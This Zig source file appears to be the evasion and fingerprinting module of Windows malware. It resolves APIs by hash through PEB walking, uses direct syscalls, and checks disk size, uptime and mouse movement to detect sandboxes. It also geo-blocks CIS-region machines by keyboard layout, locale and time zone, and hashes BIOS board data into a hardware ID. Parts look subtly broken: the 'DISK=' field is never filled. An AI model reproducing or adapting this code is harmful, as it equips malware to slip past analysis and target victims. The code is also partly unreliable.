const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

fn resolveFunc(mod: types.PVOID, comptime name: []const u8) ?*const anyopaque {
    return export_resolve.getFunctionByHash(mod, hash.encryptedHashFunc(name));
}

fn loadModule(comptime name: []const u8) ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule(name));
}

pub fn checkDiskSize() ?bool {
    const kernel32 = loadModule("kernel32.dll") orelse return null;
    const f = resolveFunc(kernel32, "GetDiskFreeSpaceExA") orelse return null;
    const GetDiskFreeSpaceExA: *const fn (dir: ?[*:0]const u8, free_avail: ?*u64, total: *u64, total_free: ?*u64) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(f));
    var total: u64 = 0;
    var free: u64 = 0;
    var path: [4]u8 = .{ 'C', ':', '\\', 0 };
    if (GetDiskFreeSpaceExA(path[0..4:0], &free, &total, null) == 0) return null;
    return (total / (1024 * 1024 * 1024)) < 60;
}

pub fn checkUptime() ?bool {
    const kernel32 = loadModule("kernel32.dll") orelse return null;
    const f = resolveFunc(kernel32, "GetTickCount64") orelse return null;
    const GetTickCount64: *const fn () callconv(.winapi) u64 = @ptrCast(@alignCast(f));
    const ms = GetTickCount64();
    return (ms / (1000 * 60)) < 30;
}

const POINT = extern struct { x: i32, y: i32 };

pub fn checkMouseMovement() ?bool {
    const user32 = loadModule("user32.dll") orelse return null;
    const f = resolveFunc(user32, "GetCursorPos") orelse return null;
    const GetCursorPos: *const fn (pt: *POINT) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(f));
    var p1: POINT = undefined;
    if (GetCursorPos(&p1) == 0) return null;
    const interval: types.LARGE_INTEGER = -@as(types.LARGE_INTEGER, @intCast(200 * 10000));
    _ = engine.NtDelayExecution(0, @as(*types.LARGE_INTEGER, @constCast(&interval)));
    var p2: POINT = undefined;
    if (GetCursorPos(&p2) == 0) return null;
    return p1.x == p2.x and p1.y == p2.y;
}

pub const GeoResult = struct {
    cis_keyboard: bool,
    cis_locale: bool,
    cis_timezone: bool,
    matched: u32,
};

fn isCisLanguage(lang_id: u16) bool {
    const primary = lang_id & 0x3FF;
    return switch (primary) {
        0x19, 0x22, 0x1C, 0x2B, 0x1F, 0x2C, 0x29, 0x2E,
        0x2F, 0x25, 0x28, 0x2A, 0x42, 0x43, 0x37 => true,
        else => false,
    };
}

pub fn checkGeoBlock() GeoResult {
    var result = GeoResult{ .cis_keyboard = false, .cis_locale = false, .cis_timezone = false, .matched = 0 };

    if (loadModule("user32.dll")) |user32| {
        if (resolveFunc(user32, "GetKeyboardLayoutList")) |f| {
            const GetKeyboardLayoutList: *const fn (count: i32, layouts: ?[*]usize) callconv(.winapi) i32 = @ptrCast(@alignCast(f));
            var layouts: [32]usize = undefined;
            const count = GetKeyboardLayoutList(32, &layouts);
            if (count > 0) {
                for (0..@as(usize, @intCast(count))) |i| {
                    if (isCisLanguage(@as(u16, @truncate(layouts[i])))) {
                        result.cis_keyboard = true;
                        break;
                    }
                }
            }
        }
        if (resolveFunc(user32, "GetSystemDefaultLangID")) |f| {
            const GetLang: *const fn () callconv(.winapi) u16 = @ptrCast(@alignCast(f));
            if (isCisLanguage(GetLang())) result.cis_locale = true;
        }
    }

    if (loadModule("kernel32.dll")) |kernel32| {
        if (resolveFunc(kernel32, "GetTimeZoneInformation")) |f| {
            const GetTzi: *const fn (tzi: *TIME_ZONE_INFORMATION) callconv(.winapi) i32 = @ptrCast(@alignCast(f));
            var tzi: TIME_ZONE_INFORMATION = undefined;
            _ = GetTzi(&tzi);
            const bias_hours = -@divTrunc(@as(i32, @intCast(tzi.Bias)), 60);
            if (bias_hours >= 3 and bias_hours <= 12) result.cis_timezone = true;
        }
    }

    if (result.cis_keyboard) result.matched += 1;
    if (result.cis_locale) result.matched += 1;
    if (result.cis_timezone) result.matched += 1;
    return result;
}

const TIME_ZONE_INFORMATION = extern struct {
    Bias: i32,
    StandardName: [32]u16,
    StandardDate: SYSTEMTIME,
    StandardBias: i32,
    DaylightName: [32]u16,
    DaylightDate: SYSTEMTIME,
    DaylightBias: i32,
};

const SYSTEMTIME = extern struct {
    wYear: u16,
    wMonth: u16,
    wDayOfWeek: u16,
    wDay: u16,
    wHour: u16,
    wMinute: u16,
    wSecond: u16,
    wMilliseconds: u16,
};

pub fn collectMotherboardInfo() ?[]const u8 {
    const reg_path = "\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS";
    var us_buf: [512]u16 = undefined;
    for (reg_path, 0..) |c, i| us_buf[i] = c;
    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(reg_path.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };
    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    var key: types.HANDLE = undefined;
    if (engine.NtOpenKey(&key, types.KEY_QUERY_VALUE, @as(types.PVOID, @ptrCast(&oa))) < 0) return null;
    defer _ = engine.NtClose(key);

    var value_us: [512]u16 = undefined;
    const vn = "BaseBoardProduct";
    for (vn, 0..) |c, i| value_us[i] = c;
    var vus = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(vn.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(value_us.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&value_us)),
    };
    var data_buf: [1024]u8 = undefined;
    var result_len: types.ULONG = 0;
    if (engine.NtQueryValueKey(key, &vus, @intFromEnum(types.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation), @as(types.PVOID, @ptrCast(&data_buf)), @as(types.ULONG, @intCast(data_buf.len)), &result_len) < 0) return null;

    const kvpi: *types.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(&data_buf));
    const raw = data_buf[@offsetOf(types.KEY_VALUE_PARTIAL_INFORMATION, "Data")..][0..kvpi.DataLength];
    if (raw.len < 2) return null;
    var utf16_len = raw.len / 2;
    while (utf16_len > 0) {
        const c = std.mem.readInt(u16, raw[(utf16_len - 1) * 2 ..][0..2], .little);
        if (c != 0) break;
        utf16_len -= 1;
    }
    if (utf16_len == 0) return null;

    var out = std.ArrayList(u8).init(std.heap.page_allocator) catch return null;
    for (0..utf16_len) |i| {
        const cp = std.mem.readInt(u16, raw[i * 2 ..][0..2], .little);
        if (cp < 0x80) {
            out.append(@as(u8, @intCast(cp & 0x7F))) catch {};
        } else if (cp < 0x800) {
            out.append(@as(u8, @intCast(0xC0 | (cp >> 6)))) catch {};
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch {};
        } else {
            out.append(@as(u8, @intCast(0xE0 | (cp >> 12)))) catch {};
            out.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F)))) catch {};
            out.append(@as(u8, @intCast(0x80 | (cp & 0x3F)))) catch {};
        }
    }
    return out.toOwnedSlice() catch null;
}

pub fn generateHwid() ?[64]u8 {
    var buf: [256]u8 = undefined;
    var pos: usize = 0;
    const disk_prefix = "DISK=";
    @memcpy(buf[pos..][0..disk_prefix.len], disk_prefix);
    pos += disk_prefix.len;
    if (collectMotherboardInfo()) |mb| {
        const mb_prefix = "|MBO=";
        @memcpy(buf[pos..][0..mb_prefix.len], mb_prefix);
        pos += mb_prefix.len;
        if (pos + mb.len < buf.len) {
            @memcpy(buf[pos..][0..mb.len], mb);
            pos += mb.len;
        }
    }
    var hwid_out: [64]u8 = undefined;
    var sha = std.crypto.sha2.Sha256.init();
    sha.update(buf[0..pos]);
    const digest = sha.final();
    _ = std.fmt.bufPrint(&hwid_out, "{}", .{std.fmt.fmtSliceHexLower(&digest)}) catch return null;
    return hwid_out;
}

fn isHexDigit(c: u8) bool {
    return (c >= '0' and c <= '9') or (c >= 'a' and c <= 'f') or (c >= 'A' and c <= 'F');
}

test "checkDiskSize returns value" { _ = checkDiskSize(); }
test "checkUptime returns value" { _ = checkUptime(); }
test "checkMouseMovement no crash" { _ = checkMouseMovement(); }
test "checkGeoBlock executes" { _ = checkGeoBlock(); }

test "generateHwid produces 64-char hex" {
    if (generateHwid()) |hwid| {
        try std.testing.expectEqual(@as(usize, 64), hwid.len);
        for (hwid) |c| try std.testing.expect(isHexDigit(c));
    }
}

test "collectMotherboardInfo returns string" {
    if (collectMotherboardInfo()) |mb| {
        try std.testing.expect(mb.len > 0);
    }
}

test "isCisLanguage known values" {
    try std.testing.expect(isCisLanguage(0x0419));
    try std.testing.expect(isCisLanguage(0x0422));
    try std.testing.expect(!isCisLanguage(0x0409));
}
